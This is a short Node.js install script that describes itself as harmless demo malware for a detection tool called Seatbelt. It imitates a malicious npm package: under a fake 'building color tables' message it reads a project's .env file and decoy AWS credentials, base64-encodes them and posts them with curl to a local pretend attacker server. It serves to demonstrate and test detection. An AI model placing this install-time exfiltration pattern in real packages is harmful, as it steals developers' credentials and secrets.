// DEMO MALWARE (harmless). This is what a malicious npm package's install script can look like.
// It only reads Seatbelt's decoy secrets and only sends them to the local pretend attacker
// server (127.0.0.1:4199), which counts the bytes and throws them away.
// The sleeps keep each step on screen long enough for Seatbelt's standard (polling) mode.
const { spawnSync } = require('node:child_process');
const os = require('node:os');
const path = require('node:path');

console.log('color-helpers: building native color tables...');
const project = process.env.INIT_CWD || path.resolve(__dirname, '../..');
const stash = path.join(os.tmpdir(), '.ch-cache');
const script = [
  'sleep 1.5',
  `cat "${project}/.env" "$HOME/.seatbelt/bait/aws_credentials" | base64 > "${stash}"`,
  'sleep 1',
  `curl -s --limit-rate 120 -X POST --data-binary @"${stash}" http://127.0.0.1:4199/collect`,
  `rm -f "${stash}"`,
].join('; ');
spawnSync('/bin/sh', ['-c', script], { stdio: 'ignore' });
console.log('color-helpers: done.');
